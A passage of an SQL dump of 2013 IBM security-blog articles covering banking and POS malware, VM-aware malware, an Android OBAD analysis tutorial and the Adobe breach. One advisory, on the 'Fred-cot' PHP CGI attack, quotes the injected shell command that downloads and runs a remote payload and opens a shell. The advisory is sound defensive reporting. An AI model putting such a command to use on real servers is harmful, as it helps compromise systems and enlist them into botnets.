thread discussing P2P Trojans. The cyber criminal who originally made the offer commented on this thread and confirmed that this malware is indeed for sale at this time. As the thread progressed, that same cyber criminal requested that the thread be shut down since he received many requests to purchase the i2Ninja malware. With increasing black market activity and the release of various malware source codes, we expect to see   and new underground offerings in 2014. i2Ninja has already been discussed in several Russian-language cyber crime forums, and IBM Security’s security team (formerly Trusteer) is actively monitoring for a live variant of this malware. Once such an attack is identified and researched, we will update with new technical details.', '\'Citadel Malware\', \'Cybercrime\', \'Financial Malware\', \'HTML Injection\', \'Malware\', \'Ramnit\', \'Security\', \'SpyEye\', \'Virtual Network Connection (VNC)\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/shadows-i2ninja-malware-exposed/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (571, 'Does it really matter if my software is built securely?', 'Diana Kelley', '2013-11-18', 'A couple of weeks ago, I was meeting with the application security team at a Fortune 500 company and one of the testing team members asked, “ ” Adherents, including yours truly, to the importance of building security into software and implementing secure by design methodologies might scoff at that kind of question. But, consider for a moment if there’s any merit in it. I believe there is, but in limited use-cases. Perimeter defense appliances should never be considered as replacements for robust development practices. However, there are several situations where bolstering your perimeter defenses to protect your applications makes perfect sense. Here are four practical examples: A “ ” approach calls for building security in from the requirements definition phase, and incorporating it through all phases of the development lifecycle. Security reviews and risk assessments during architecture and design, static testing during implementation, dynamic testing at pre-launch and ongoing security testing and monitoring in production.   Find and fix each and every vulnerability, before putting applications into production.\n  Even the most stringent development processes can miss hard-to-find vulnerabilities like business logic errors. And, changes in rapidly-evolving production environments can expose vulnerabilities that weren’t visible before.\n If your exposures can’t be fixed immediately, placing rules on perimeter devices that can block exposure and prevent future exploits may be a lot more business-friendly than taking your applications off-line. If you’ve worked with web application deployments, you’ve probably experienced that last-minute “oh-no” moment, when security testing comes back with a stack of high-risk issues and recommendations (or rather, mandates) not to launch applications until issues are remediated. If there’s a critical business need to get applications into production ASAP, sending them back to development for revisions may not be an option. Standard operating procedures often require application or business unit owners to sign off on exceptions, accepting risks before they place the apps into deployment. Rather than placing known vulnerable apps into production in an unprotected state, doesn’t it make better sense to write rules for perimeter devices to block those exploits? Granted, not every vulnerability can be blocked or mitigated in that fashion, but having some protection is definitely preferable to having none. Great day in the morning! The     just finished her  , and your company failed because a web application that stores, processes or transmits credit card data is vulnerable to  . While it may be too late to pass the  , it isn’t too late to block the exploits, if you can place rules on your web application firewall to mitigate the exposure. For a while in the 90s, many of us hoped that as old, legacy applications and languages were retired, we could usher in a golden age of strong, well-tested secure web applications. Sadly, that hasn’t been the case. Ironically, most companies struggle with “legacy web apps” that were written years ago, but are popular with users and simply aren’t ready to be replaced. Development costs for new applications that offer the same user experience may not be available, and developers who wrote the original apps are probably long gone. And, since attackers are getting ever more clever with their exploits, those legacy web apps may be particularly vulnerable to older attack vectors. Again – wouldn’t it be better to put some kind of protective rule on perimeter devices, instead of leaving your applications completely wide open? All of the above are mentioned as limited-use stop-gaps or compensating controls, to be employed while applications can be remediated and vulnerabilities removed. And, in no way am I suggesting that all   and   can prevent every exploit path through to your web applications. But if vulnerabilities can be mitigated with perimeter devices or other compensating controls, shouldn’t they be? Have you used these strategies in practice? Do you agree that they’re valid use cases? Please let us know in the comments section.', '\'Compliance\', \'Firewall\', \'Software\'', 'https://securityintelligence.com/software-built-securely-application-security/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (572, 'SOC Blog: \"Fred-cot\" attack targeting web servers attempting to create botnet', 'Bryan Ivey', '2013-11-7', 'On Saturday, November 2, the IBM SOC detected an active attack attempting to infect several webservers to become part of a botnet.  IBM has identified this attack with the name “Fred-cot.”  “Fred-cot” was part of the FTP URL where the malware repository was located as well as part of the user name / password required to access the site.  The attack, which was active over the weekend but began to taper off earlier this week, is attempting to exploit an older vulnerability in PHP.   It works by attempting to connect to port 80 (web) on a targeted IP and injecting a shell command, which if successful, allows the malware to infect the victim’s system. The original attack appeared to originate from the IP address 72.26.194.138. This attack was first spotted by our threat analysts at 7am Eastern on Saturday, November 2nd. IBM is identifying this attack as “Fred-cot.” This address appears to be crawling IP address ranges attempting to connect to port 80 (web) on the targeted IP. Once a connection has been made, the attacking system attempts to inject a shell command. If this command is successfully run on the victim’s system, this malware would connect to 31.204.152.37 via FTP to download gj.exe. Once gj.exe had been downloaded and executed, the victim’s system will be connected to an IRC channel and will wait for further commands. Site names mail.sermonshare.com, mail.radioworship.net, web1.sermon.net, and web02.sermmonshare.com all resolve to the 72.26.194.138 address. Activity to and from these site names should be considered suspicious at this time. Site names mijn-site.be, jinraforest.be, faker.eu, euroveiling.com, busimatch.com and six other hosts resolve to 31.204.152.37. Any activity to or from these sites should be considered especially suspicious. This IP is the repository for the malicious code. unset HISTFILE; unset HISTSIZE; uname -a; cd /tmp;wget ftp[COLON]//fredcot[COLON]fredcot123[AT]31.204.152.37/gj.exe;perl gj.exe;rm -rf gj.exe;w; id; /bin/sh -i’;x0a$daemo 83.170.75.200 appears to be the IP address of the IRC server the malware payload is using as a command and control (C&C) server. We strongly recommend applying firewall rules to block any access to or from the 72.26.194.138, 31.204.152.37, and 83.170.75.200 addresses. Security teams should be aware that IP addresses specified could potentially change. Some anti-virus vendors can detect this malware and it is advisable to verify your software and definition files are up to date. This attack appears to be targeting an old vulnerability, CVE-2012-1823, in various versions of PHP paired with Apache web servers. This vulnerability was patched in 5.4.3 and 5.3.13 last year and we covered it in a number of assessments in the months of May and June. This vulnerability deals with an obscure portion of the CGI specification. Other web servers do not adhere to these specifications as Apache does. The payload of the attack, gj.exe, contrary to implications the name implies, is not a Microsoft executable, it is a Perl script. There were four different variations of the script on the compromised site located at 31.204.152.37 that contained slight differences with the IRC server, ports used, IRC admins, and channels. There were also a number of files containing IP addresses, although their exact use is not known. Other tools located in the directory structure may have been used to generate the list of targets or possibly used in another form of attack. Once infected and executing the malware, the victim’s system would become just another bot in the botnet. Based on the code, it appears the malware attempts to avoid detection by hiding itself as just another /usr/sbin/sshd process on the system. Connecting back to an IRC server, the victim would wait for commands sent to it through a private message. These commands could include We strongly suggest that our readers take the time to verify their PHP installations are current and are patched against this old vulnerability. This attack seems to indicate there may be systems facing the Internet that are not. As mentioned before, some anti-virus products do detect this malware. Users should ensure their anti-virus software and associated definition files are up to date. It is also advisable to block traffic to and from the hosts listed below at the perimeter firewalls. Please note, these are the IP addresses we have detected in this wave of attacks and could potentially change in the future.  Administrators should monitor their logs for any suspicious activity. Current list of hosts that should be blocked due to malicious activity:', 'None', 'https://securityintelligence.com/soc-blog-fred-cot-attack-targeting-webservers-attempting-to-create-botnet/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (573, 'Demo on Amplifying Security Intelligence with Big Data', 'Vijay Dheap', '2013-11-6', 'There has been a lot of excitement and buzz in the industry about Big Data, and how it can be used to amplify Security Intelligence to provide greater protection against advanced threats, fraud, and insider threats.  IBM’s integrated   solution does all of  and more. Using our solution, you can identify suspicious external domains and endpoints that your systems and users are connecting to, identify dangerous external command and control domains, and find users who are prone to attacks such as spear phishing due to their propensity to click on suspicious url’s.  But don’t take it from me, seeing is believing.   demonstration given by Jose Bravo of the IBM Security Tiger Team that showcases the power of IBM QRadar Security Intelligence working with Big Data.  In this video, you can see how and the Big Data Platform: Check out this   to see our solution in action!', '\'Big Data\', \'IBM Security QRadar\', \'IBM X-Force Research\', \'Malware\', \'Security Intelligence\'', 'https://securityintelligence.com/demo-big-data-security-intelligence/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (574, 'Are Cyber Criminals Looking to Target SAP Users?', 'Dana Tamir', '2013-11-5', 'It has long been known that cyber criminals utilize advanced information-stealing malware and Trojans to gain access to corporate endpoints and networks, disrupt operations and steal sensitive business data, intellectual property and financial information. A recent example demonstrates how cyber criminals are using advanced data malware to target mission-critical enterprise resource planning (ERP) applications such as SAP. The new variant of the  , a well-known banking malware, has recently been discovered. The Trojan was originally designed to provide the attacker with remote access to the infected PC and steal   such as passwords and cryptographic certificates connected to online banking. To execute remote commands and exfiltrate data, Shiz creates a back door and communicates with a specific domain. The new variant includes all of these capabilities and also searches infected systems for the existence of SAP applications. “All it does right now is to check which systems have SAP applications installed. However, this might be the beginning for future attacks on SAP,” said Alexander Polyakov from ERPScan, who shares the Shiz malware variant discovery with antivirus company Doctor Web. SAP provides workstation client software that communicates with its application servers. These clients serve as the entry point to a wide range of business SAP applications. The configuration files of these SAP users’ applications contain the IP addresses of the SAP servers they connect to. Once attackers have remote access to the infected PC, they can easily read the configuration files and graphical user interface automation scripts, grab user credentials and even hook into application processes. SAP applications provide an integrated view of business processes that range from finance and accounting to extended supply chain operations. Large enterprises and global companies rely on these mission-critical SAP applications to provide accurate, up-to-the-minute operations and financial information. Attacks against SAP applications that cause downtime or result in   can put businesses at significant risk. Trusteer Apex Data Exfiltration Prevention technology prevents Shiz from opening the back door needed for data exfiltration and remote access. By deploying Trusteer Apex on employee PCs, enterprises can easily prevent endpoint compromise and protect critical business applications without impacting the SAP users or application availability.', '\'Cybercrime\', \'Cybercriminals\', \'IBM Security\', \'Online Banking\', \'SAP\', \'Trusteer Apex\'', 'https://securityintelligence.com/cyber-criminals-looking-target-sap-users/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (575, 'Top Resources to Get Started With Application Security Testing Today', 'Diana Kelley', '2013-10-28', 'Web application attacks get a lot of media coverage and there’s no end of experts and analysts underscoring the importance of testing applications. But it can be hard to know where to start. Should you buy a tool? Take a course? Just starting testing random web sites you find online? In this post we’ll provide a short outline on   in two steps. Dynamic testing of web application is only a part of a comprehensive secure software development lifecycle. Secure software starts during the requirements phase when security requirements are defined and fed into the design and architecture phases. We’re not trying to give short shrift to the importance of developing a complete, end-to-end secure development lifecycle, however, for the sake of brevity; this post is focusing only on dynamic testing of web applications. Dynamic testing of a web application means attempting to find vulnerabilities and exploits within the running application. In other words, it’s like being the attacker – you attempt to attack an application to determine whether or not a real attacker could attack it. Attacks can be done manually or with the help of a scanning tool. (More on tools in step two.) Now that you know a little of what web application testing is about, it’s time to try out some testing! Many commercial vendors offer trial versions of their tools and there are a number of freeware tools available. The   maintains a full list of both  .  IBM has a detailed post on how to  . If you’re not sure what to test and don’t want to risk getting fired for learning how to test by scanning your company’s live production servers,   has a list of  . The   is a fully functional, unlimited version of the IBM Security AppScan Standard product. The only restriction is that scanning is limited to one site, Altoro Mutual at  . We provided this site to testers so that you can explore the testing process without fear of bringing down a production site. If you haven’t tried IBM Security AppScan before here are a few of the features and benefits: We have a   to help you get started along with a   and an  . Whether you’re just curious about how application security testing works or are thinking about making it your next career move, you can get started today – for free with the resources and tools listed above.', '\'Application Scanning\', \'Application Security\', \'Application Security Testing\', \'IBM Security\', \'IBM Security AppScan\', \'Open Web Application Security Project (OWASP)\', \'Technical & Product\', \'Web Applications\'', 'https://securityintelligence.com/top-application-security-testing-resources-started/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (576, 'Protecting POS Systems From Dexter and Other Advanced Malware', 'Dana Tamir', '2013-10-24', 'Maintaining the security of point-of-sale (POS) systems is a growing concern. A number of malware families targeting them were discovered this year, including Dexter, vSkimmer, BlackPOS and Alina. These are all examples of advanced malware designed to steal payment card information at the point of sale. One of the most interesting commonalities across these malware families is their use of a command-and-control (C&C) communication channel for  .\n Dexter, for example, is a malware that targets  , first discovered in December 2012 by Seculert. Dexter steals payment card data from the POS system and sends it to a C&C server hosted in the Republic of Seychelles. Most POS systems infected by Dexter run on Windows platforms: More than 50 percent of the infected systems run Windows XP, 17 percent run Windows Home Server, 9 percent run Windows Server 2003 and 7 percent run Windows 7.\n Dexter’s method for infecting POS systems has yet to be determined. It is possible that POS systems are infected via drive-by downloads, but there is no evidence that this is the case. Some security experts believe that hackers establish a remote connection to the POS system (using misconfigured firewalls and default passwords on system processes) and then drop malware like Dexter directly on the machine.', '\'BlackPOS\', \'Command-and-Control (C&C)\', \'Credentials Theft\', \'Data Exfiltration\', \'Dexter\', \'Drive-by Download\', \'Point-of-Sale (POS) Systems\', \'vSkimmer\', \'Windows 7\', \'Windows XP\'', 'https://securityintelligence.com/protecting-pos-systems-from-dexter-and-other-advanced-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (577, 'Virtual Machines and How Malware Authors Know When They Are Being Watched', 'Nishad Herath', '2013-10-16', 'Continuing on from the  , in this post I want to explore two questions. The answer to the first question is simple enough. System virtual machine software is designed to mimic the hardware functionality of a bare metal computer well enough, to be able to run the same operating systems and application software you would run on the real hardware. Granted that in reality it is not so clear cut. For example modern CPUs implement special hardware features and instructions, referred to as hardware assisted virtualization features that enable virtual machine software to operate more efficiently and execute code faster on such CPUs compared to relying on strictly software based virtualization techniques. Many modern virtual machine monitors (VMMs), at the hearts of virtual machine software, do indeed use these hardware assisted virtualization features provided by the CPU they run on (host CPU) to at least some extent by default. Some virtual machine monitors even virtualize these hardware assisted virtualization features well enough these days! Also virtual machine software do have the ability to allow, to varying degrees, direct access to some types of actual hardware on the host system (for example USB peripherals). But regardless of how sophisticated these virtual machine software tend to be, they are not 100% identical to the real hardware. In fact, one could argue that the goal of virtual machine software is to provide a platform that can facilitate the execution of multiple operating systems concurrently, both efficiently and with an accepted level of isolation (as well as a required amount of sharing capabilities) rather than to provide an environment identical to bare metal systems. As long as the operating systems can run fine and the majority of software running under these virtualized operating systems are running fine, virtual machine software is considered to be doing their job well. However, some   on the other hand look for specific differences that can be detected when they are on virtualized operating systems running inside virtual machine software. These differences are of course largely irrelevant when it comes to running operating systems themselves and application software inside the virtual machines. But such differences do give malware the chance to determine if they are running inside a real or a virtual machine. Most such malware which look out for any telltale signs of being run inside popular virtual machine software however, in the absence of such signs, tends to determines that the malware is indeed running on real hardware. The answer to the second question “how exactly do some malware behave differently on real hardware vs VMs” is that this can vary quite a bit depending on the specific malware. But some of the   is: So now that we know some of the different ways in which some malware behave inside VMs compared to real systems let’s take a closer look  . So either by themselves or in combination, the above areas appear to be fruitful for malware authors in detecting if their victim is real or if they are being watched inside a VM. But this is not the end of it. What are some of the even more sophisticated detection methods? So that brings us to the end of our brief exploration and is by no means exhaustive. For example, even at this level of detail, a few more posts would probably be needed to do justice  . Hope you’ve enjoyed this brief exploration. Please feel free to explore the site for many other interesting discussions in computer security. It has been a pleasure exploring this topic with you and as always comments are welcomed.', '\'Citadel Malware\', \'IBM X-Force Research\', \'Malware\', \'Malware Analysis\', \'Virtual Machine (VM)\'', 'https://securityintelligence.com/virtual-machines-malware-authors-being-watched/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (578, 'DIY: Android Malware Analysis – Taking Apart OBAD (Part 1)', 'Zubair Ashraf', '2013-10-14', '[testimonial author=”Sun Tzu, The Art of War”]If you know the enemy and know yourself, you need not fear the result of a hundred battles. If you know yourself but not the enemy, for every victory gained you will also suffer a defeat. If you know neither the enemy nor yourself, you will succumb in every battle[/testimonial] I plan on writing regular posts in the   series with the goal of not only understanding malware, vulnerabilities and exploits but also to share with our readers some techniques and tools they can use themselves to “know the enemy”. I am also looking forward to hearing about your experiences in analyzing similar threats with similar or more efficient tools & techniques. Alright, so let’s get right into it, OBAD has been agreed upon to be   and you can find various  . In this series we will take it apart together and learn about its functionality and various techniques that it uses to gain more power, avoid removal and making analysis harder. In part 1 we will see how to use dynamic code analysis, debugging using jdb, smali (dalvik disassembly source) level debugging, using jdb commands to learn about reflection code being invoked and see through string decryption, using IDA to understand and visualize control and data flow, modifying AOSP code and building a custom system image to bypass anti emulator tricks used by OBAD. We will using the sample with md5: e1064bfd836e4c895b569b2de4700284 ( ) . You can download it from  The   can be simply uncompressed just like zip files to obtain their contents, which include the   this is usually in the binary format and can be converted into a readable file by downloading   and running Upon unzipping the apk file you will also get a classes.dex file which is a   that contains the application code. To speed things up I would recommend using   distribution, although it needs a lot of upgrades, but seems to be a good choice to get things started quickly. It comes with a lot of tools pre installed. Once you have it on running on a virtual machine (  is a pretty neat and robust free virtualization solution). Another advantage of doing this in a virtual machine is that you can take snapshots at desired intervals, revert machine to it during your analysis and try out other routes of analysis. I have created a short text file showing the steps I took on mobisec VM to upgrade android sdk, download python 2.7 and install  . You can get it from  One of the very first things you can do is submit to some of the online analysis services and get an overview of what the sample does (esp. if you are not concerned that this could be a targeted attack and by submitting to online services you may caution the attackers). Here are a few: So you can go ahead and try the   sample with these tools now, or do that later and lets see what we can discover for ourselves. If you are not already familiar with  , I would recommend you take some time to review these: I started with an AVD that comes with the sdk for Android 4.0.3 running api android-15 revision 3 and launched the emulator as: Once the emulator is up you can install the sample as: After that if you go and check out the apps installed you do not see any new launcher icon. Let’s take a look at some log entries we can use   and see the following relevant messages by running “adb logcat” (for more details you can run it as “adb logcat -d -v long”: So let us try to get some info about the package we just installed, a lot of information can be extracted by the commands that can be launched via the adb tool in sdk, I also like to use the   tool to get info about any package. Once you are in the drozer console you can try these to get some info about the package as: I will now describe how I went about debugging this application. You can read about the debugging infrastructure and available options  . I used jdb command line debugging and here is how I did my setup. Note, we already have the emulator running and the apk installed. So I started the  , which has the   tool. In the emulator, go to applications view, click on devtools and then choose “Development Settings”, click on the app name (usually none by default) under “Debug app” and then from the application list scroll down and select com.android.system.admin. Also select “wait for debugger”. \n Now you can launch the app using drozer or the sdk tools as The application then will wait for a debugger to attach. This will also result in application’s debug port being forwarded to the default port 8700. I used the command line debugging tool  . Note that once a debugger attaches to the app, waitForDebugger method checks to see when the last activity occurred in debugger, and if nothing has happened in a certain time period then it resumes the app so it is important to set any breakpoints etc in .jdbrc file in the home directory that jdb reads upon startup. jdb can be attached to the application waiting for debugger by: Just before attaching the debugger it will be a good point to create a VM snapshot, so we can return to it when trying different debugging breakpoints during subsequent runs of the app. I tried debugging this app by setting a breakpoint on onCreate for the launcher activity CCOIoll but it never got hit in the debugger. So I tried the following: This can be done by having the following line in the .jdbrc file in the user’s home directory. trace go methods\n But this did not work, as it caused too much debugger activity and the app was not able to come out of android.os.Debug.waitForDebugger() which depends on the time period elapsed since lastDebuggerActivity() and only exits it it exceeds a set duration. So then I realized let’s try to break on   i.e. for our case I added the following in the .jdbrc file When this breakpoint hits then you can run This gives us an idea of what parts of the code were executed, by comparing the entry and exit lists we also see that we enter com.android.system.admin.COcCccl.onCreate() but do not exit it, so somewhere in there we exit the application. We do not see any method entry that shows us that some anti VM checks are happening nor do we see any java methods that cause application shutdown. One of the reason for these is So we do not see methods being entered / exited from these packages, when we run trace go methods. Let us then try to explicitly set a breakpoint at java.lang.System.exit, we already have a VM snapshot we can revert to, edit our .jdbrc file (put in “stop in java.lang.System.exit(int)”), run the app again, attach jdb to it and we see: So it is now time to dive into source code. Remember earlier we talked about getting a dex file from the apk file. Android code is typically written in Java, the Java class files are then converted into .dex (i.e. Dalvik Executable) file which run on the   virtual machine that is used in Android. I like the following options (and there may be others): apktool version 2 has pretty nice support for  , at the time of writing this entry, version 2 was not released but can be  Once you have built version 2 of the apktool, you can do the following: We will talk about how this will be useful for debugging in a short while, let’s look at how you can repackage this into an apk file. If you like you can modify the smali code before repackaging. Prior to repackaging delete the MANIFEST folder that contains signatures and certs – so that you can freshly sign it. Note, since OBAD uses a non compliant android manifest file, to confuse tools, you will have to first fix it To be sure your manifest file is valid you can use the aapt tool (you will find it under platform tools in your android sdk installation: To resolve errors you can refer to specs  , once you have edited the xml file so that no more errors are reported you can proceed to repackage as: Now that we have the recompiled/repackaged apk, lets install it, and get ready to attach jdb to it as described above. Again taking a VM snapshot just before attaching jdb would be helpful. We add the statement “stop in java.lang.System.exit(int)” in .jdbrc file and now that we have access to smali code in jdb we also tell jdb about it by using We can now use those as regualar files for setting breakpoints at specific line numbers in java files and examine smali variables as java variables Now we can look at the contents of the file smali/com/android/system/admin/COcCccl.java that was generated by apktool, and we see: We can pull up this code in IDA as well and have a better view of control and data flow. This can be done by unzipping the newly packaged apk file that we created with apktool and opening the classes.dex file in IDA Pro. When I did that I encountered the following error: bad dex version (0x30 33 36 00)\n The developers are aware of this and this may been fixed now, but if you get this error you can fix this by fixing the version in dex file. You can open the dex file in any hex editor and change the hex value at offset 6 from 0x36 to 0x35, save the modified classes.dex file and open it in IDA. (0x30 is ASCII code for ‘0’, 0x33 for ‘3’ and 0x36 for ‘6’) Note the bytecode index /pc value and the line number that we see in stack trace from jdb is not the same as hex addresses / or even relative distance from start of method in the IDA view, as IDA view disassembles dex byte. Nevertheless, we can find the code area we are looking for in a method and analyse in IDA, so for our exit call at hand we see: Looking at this we see that we exit if the string comparison results in true, we do not take the branch in if-eqz, and so we call System.exit() invoke-virtual {v0, v1}, <boolean String.equals(ref) imp. @ _def_String_equals@ZL>\n Also we can see that v1 = “sdk” from the output of the “locals” command in jdb and IDA graph shows us that v0 comes from use of string decryption and reflection: This seems like some anti VM/emulator check, and what I did next was get information about all reflection related calls to get an idea of what the malware is doing, and then also annotated what each call was returning so that all this information would be handy for further analysis. This is the .jdbrc I used for gathering reflection related information: (Note for a different sample, you can also grep the smali code for reflection related calls and set your breakpoints accordingly) I use the suspend, cont, resume commands to just cause additional delay so that all the output gets printed properly and not interleaved, note the use of breakpoints on exec, this can show you if the app invoked external processes, and can be interesting, if you try it out you will see that OBAD does invoke an external program and uses the result to check something, I will let you discover it. You can use this .jdbrc, run jdb and redirect output to a file for later analysis. We learnt that the interesting reflection call was just java.lang.Class.getField and this is what we found out for the names of Classes and fields for which getField is invoked. Note, this shows us info about what was called and from where, but not the return values, so that can be obtained by setting breakpoints just after the call returns and dumping locals etc. Anyways for our exit situation we see that line COcCccl.java:5,683 calls getField to get android.os.Build.MODEL which results in “sdk” for the emulator image and therefore we exit. There are various strings and settings that can tell about the system, os, hardware etc, most of these can be seen by running getprop on shell, such as “adb shell getprop”. For reference you can view results of running getprop for a few configurations by looking at the linked files. Now to bypass the anti VM tricks used by malware there are various different techniques: Instructions to download and build AOSP can be found  . Class android.os.build fields such as model are populated within android/os/Build.java, so I fetched AOSP code for branch 4.3_r3 and made the following changes: I selected the target “aosp_arm-eng”, compiled and obtained a fresh system.img file in out/target/product/generic/, this is what I will use with the emulator and install OBAD on it. android avd\n I named my device Nexus_4_on_4.3_api_18_custom. Now everything should be taken care of, but for some reason, either it is the smartness of the SDK, or I missed something, so make sure things are as they should be – edit the avd config file and have the system.img pointing to your custom system image For me the config files was /home/mobisec/.android/avd/Nexus_4_on_4.3_api_18_custom.avd/config.ini You can launch the emulator as: If you hit a breakpoint in jdb and try this you would see the modified java code doing its trick: Note, as we have just modified java code, the values returned by getprop command are not changed. If you then install OBAD on this new AVD, and then manually start the launcher activity you would see the following screen to get Device Admin access. Why do you need to start the launcher activity manually, and why does it not request the device admin permission upon install, is something for next blog entry, or perhaps I will let you figure it out. BTW we did not need to modify the AOSP code to work with OBAD, as you can see from the getprop output for AOSP, the value returned for build.model is not “sdk” by default, but nevertheless now you know how you can customize the android java library code.   Well that’s it for today, I hope you enjoyed and benefited from the post and I look forward to your feedback.', '\'Android\', \'IBM X-Force Research\', \'Malware\', \'Malware Analysis\', \'Mobile Security\', \'Technical & Product\'', 'https://securityintelligence.com/diy-android-malware-analysis-taking-apart-obad-part-1/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (579, 'What Analysts are Saying About IBM Security’s Acquisition of Trusteer', 'John Burnham', '2013-10-11', 'It is always thrilling when thought leaders endorse, agree with or support a major initiative. But, far more powerful is when analysts comment publically or write reports aimed at customers and partners with a message that a vendor understands their pain and is successfully executing a strategy that addresses that pain in a unique and comprehensive way. It is now clear to   that placing the burden of deploying a bunch of siloed point products in a multi-perimeter world squarely on them or on their partners is no longer good business. , a very successful advanced   provider, who in a very short period of time has dominated the financial industry with their solution. We are thrilled to have this excellent company made up of excellent employees on our team. Having been acquired by IBM less than two years ago, and having grown this new Security Systems division rapidly in that time period, we know the challenges and how to best provide our customers and partners with both the best-in-class products they require and also the broad platform and integrated solutions more and more customers are demanding.', '\'Analysts\', \'Forrester\', \'Fraud\', \'Gartner\', \'IBM Security QRadar\', \'Mobile Security\', \'Q1 Labs\', \'Security Information and Event Management (SIEM)\', \'Security Intelligence\', \'Technical & Product\', \'Trusteer\'', 'https://securityintelligence.com/trusteer-ibm-security-acquisition-analyst-response/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (580, 'You Are Being Watched! Ways Malware Authors Are Fighting to Maintain FUD Status', 'Nishad Herath', '2013-10-7', 'As you would imagine,   are acutely aware of their need to maintain the   status, as it is commonly referred to in the malware world, of the malware they create, for as long as possible. The longer the malware perpetrators can delay detection of their malware by security products, the longer they can keep reaping their ill gotten gains from infiltrating their victims. These ill gotten gains could come in the way of the ability to use victim computers for  ,  ,   or even for tunneling attacks through to other systems via these victim computers to obscure the true origin of attack. Of course this is all in addition to the potential for exploiting users who use these victim computers, in ways which can range from straightforward identity theft and theft of financial information to even the theft of any private or proprietary information monetizable in the cyber crime black market. Then there are the more elaborate blackmailing attempts made against some victims by leveraging any compromising information harvested through webcams or microphones, which seem to be getting some media attention lately. As the malware market matures, malware perpetrators seem to   as time passes. So what are some of the things malware authors have to fight against to maintain this coveted FUD status and what are some of the strategies they employ? First they have to . Malware have historically fought such security technologies by changing the nature of the binaries that the malware is composed of on an ongoing basis by using an array of different techniques. This cat and mouse tug of war has been waging on for decades. As security products incorporate better heuristics and deeper analysis methods which recognize the binary features beneath the surface obfuscations, malware authors have responded with more elaborate obfuscations and better polymorphism. The contemporary original malware entry vectors range from exploiting security vulnerabilities commoditized by exploit packs floating around in the cyber crime market to plain   via spam campaigns, compromised websites or sometimes even newspaper classifieds! It is not uncommon to even see private zero day security vulnerabilities used to pry open an entry vector into victim computers. Unlike a couple of decades ago, malware has not been reliant on file sharing between users to spread for quite some time, even though P2P networks and pirated software distribution sites are still routinely used by malware perpetrators as means of reaching new victims. While both security technology vendors and operating system vendors have addressed and continuously update any technical shortcomings that make this type of infiltration feasible,   tend to largely sidestep security technologies and infiltrate by directly exploiting users. That said however, security products have over the years come to incorporate detection methods to identify these infiltration attempts, both known and novel (based on heuristics) thus attacking the FUD status of malware at the point of spreading, even at the network layer. To address this, malware have  , specific attacks against spam filtering and also other means such as using advertising networks to deliver attacks to users who visit websites they trust. Automated web crawlers deployed by security vendors to detect distribution points of malware is fought against by not delivering malware to known web crawlers or anomalous potential victims. Malware albeit to a lesser extent have even adopted changing the way it behaves to fool security technologies that vigilantly guard against software behaviour that is seen within a system which is likely to be the action of malware.  installations have also become quite sophisticated in recognizing both mass infiltration attempts and C&C (Command & Control) channels used by malware, so again the   are employed in this domain too by malware authors to further their goal of maintaining a FUD status for their malware. In all of these various different battlegrounds where the greater war against malware is fought, the   has proven to be the essential first step which eventually leads to the malware being detected on a broader scale by security products, thus ripping the FUD status away from such malware. Given the degree of malware data sharing and the well seasoned analysis capabilities of the security industry, when malware generally loses the FUD status to one security vendor, it is not long before the rest of the industry follows and malware authors have to address being detected on a large scale. Therefore, malware authors rightfully recognize that it is paramount to deter the analysis of their malware for as long as they can, buying them time to reap benefits of the malware campaigns. Thus in a nutshell, malware authors tend to desire the verification of the authenticity of the environment their malware is running in to ensure that their victim is real and not an analyst attempting to uncover the inner workings of the malware so the security technologies can be adapted to detect the malware. In my next post we’ll continue this exploration zooming in on  In the meantime, please leave your thoughts and comments below.', '\'Distributed Denial-of-Service (DDoS) Attacks\', \'IBM X-Force Research\', \'Malware\'', 'https://securityintelligence.com/malware-authors-fud-fully-undetectable/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (581, 'Massive Adobe Breach Puts Organizations at Risk of Zero-Day Exploits', 'Dana Tamir', '2013-10-4', 'In an important announcement yesterday, Adobe notified customers that its network had been breached. During this Adobe breach, the attackers illegally accessed information relating to 2.9 million Adobe customers and source code for numerous Adobe products. According to  : “Our investigation currently indicates that the attackers accessed Adobe customer IDs and encrypted passwords on our systems. We also believe the attackers removed from our systems certain information relating to 2.9 million Adobe customers, including customer names, encrypted credit or debit card numbers, expiration dates and other information relating to customer orders.” The announcement doesn’t provide many details, but Adobe Acrobat may have been one of the compromised products, according to  , author of Krebs on Security, who conducted an interview with Adobe’s Chief Security Officer Brad Arkin. “Arkin said Adobe is still in the process of determining what source code for other products may have been accessed by the attackers and conceded that Adobe Acrobat may have been among the products the bad guys touched,” Krebs wrote. The Adobe breach puts organizations and users at significant risk. If the source code for Adobe Reader or other popular Adobe applications was stolen, it means that   now have the opportunity to search this code for unknown vulnerabilities and develop malicious code that exploits them. You can expect that we will soon have a stream of new, nasty, zero-day exploits.  are used to execute drive-by downloads. They are very effective because   that are designed to detect threats are not yet familiar with these new, never-before-seen threats. Therefore, they do not block them. Since these exploits would be new, there wouldn’t be a patch available, either. Attackers can hide zero-day exploit code within a PDF document or other content such as Flash animations to create weaponized content. Then, a specifically crafted   is used to deliver the weaponized content to the targeted user. When the user opens the attachment or watches the animation, the code exploits the vulnerability to silently download malware on the user’s machine, so the user isn’t aware that this download has happened. But this malware, often a Remote Access Trojan, enables the attacker to access sensitive data or even gain full control over the user’s machine. In many cases, the targeted user is an employee within a  . By compromising the user’s machine, the attacker gains a foothold within the targeted organization’s network. From here, the attacker can progress the attack and breach the organization. Since Adobe products are widely used, they have become a popular way to compromise   and enable Advanced Packaging Tools and targeted attacks. Since users are accustomed to receiving PDF 